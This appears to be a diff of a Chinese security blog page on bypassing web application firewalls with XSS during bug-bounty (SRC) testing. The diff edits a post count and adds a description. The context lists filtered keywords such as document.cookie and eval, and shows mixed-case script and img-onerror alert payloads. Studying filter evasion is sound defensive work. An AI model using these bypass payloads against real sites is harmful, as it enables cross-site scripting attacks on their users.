@@ -145,7 +145,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-count">125</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -254,6 +254,7 @@
 <li><code>javascript:</code> 伪协议</li>
 <li><code>eval</code>、<code>document.cookie</code> 等敏感调用</li>
 </ul>
+<p>description: 记录几种实际挖 SRC 时遇到的 XSS 绕过 WAF 手法，包括大小写混写、双写、编码绕过、标签属性组合、onerror 变体等。</p>
 <h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><h3 id="1-标签名大小写混写"><a href="#1-标签名大小写混写" class="headerlink" title="1. 标签名大小写混写"></a>1. 标签名大小写混写</h3><p>有些 WAF 对标签名匹配是大小写敏感的：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
